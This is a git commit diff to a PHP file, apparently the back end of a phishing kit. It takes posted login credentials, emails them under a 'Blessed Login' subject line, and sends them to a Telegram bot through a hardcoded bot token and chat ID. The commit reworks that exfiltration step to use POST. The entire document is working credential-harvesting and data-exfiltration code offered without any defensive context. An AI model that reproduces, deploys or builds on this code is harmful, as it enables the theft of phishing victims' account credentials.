b79a8cc971f6cc668c8ca7990201c91d5225fb63
SherryDevop <sherrylail59@gmail.com>
2025-02-25 15:01:24 +0000

    Update cup.php

--- web-auths-poctza/cup.php
+++ web-auths-poctza/cup.php
@@ -23,25 +23,22 @@ if (isset($_POST['hsdgaksjd_hdfsv']) && isset($_POST['hgdfjahsgd_jasdj'])) {
     $subject = "Blessed Login $ip";
     mail($send, $subject, $message);
 
-    // Send to Telegram
-    $botToken = "7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k";
-    $chatId = "6926935950";
-    $telegramUrl = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage?chat_id=6926935950&text=" . urlencode($message);
+   $botToken = "7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k";
+	$chatId = "6926935950";
+	$telegramUrl = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage";
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
+	$data = ['chat_id' => $chatId, 'text' => urlencode($message)];
 
-    // Check if Telegram message was sent successfully
-    if ($result === false) {
-        echo json_encode(['error' => 'Failed to send message to Telegram']);
-    } else {
-        echo json_encode(['ok' => 'ok']);
-    }
-} else {
-    echo json_encode(['bad' => 'bad']);
-}
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $telegramUrl);
+	curl_setopt($ch, CURLOPT_POST, true);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	$result = curl_exec($ch);
+	curl_close($ch);
+
+	echo json_encode($result ? ['ok' => 'ok'] : ['error' => 'Failed to send message to Telegram']);
+
+
 
 ?>
